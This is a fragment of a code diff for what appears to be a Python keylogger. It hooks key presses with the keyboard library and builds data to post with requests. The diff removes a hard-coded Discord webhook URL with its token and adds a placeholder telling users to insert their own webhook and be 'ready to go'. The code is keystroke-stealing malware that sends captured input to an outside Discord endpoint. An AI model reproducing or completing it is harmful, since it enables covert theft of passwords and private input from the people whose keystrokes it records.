@@ -1,9 +1,9 @@
 import keyboard
 import requests
 
-url ="https://discord.com/api/webhooks/1289809072660414546/zTMPVicrIc9QT-QYz0xJ9qdt-37Ph6zq7iXePI3zPjRCcH_uJ4PXUMU94L-vJo-6yp-J"
-
-
+# url =""
+# add your discord webhook in the url variable
+#********************AND YOU ARE READY TO GO********************#
 
 def on_key_press(event):
     data = {
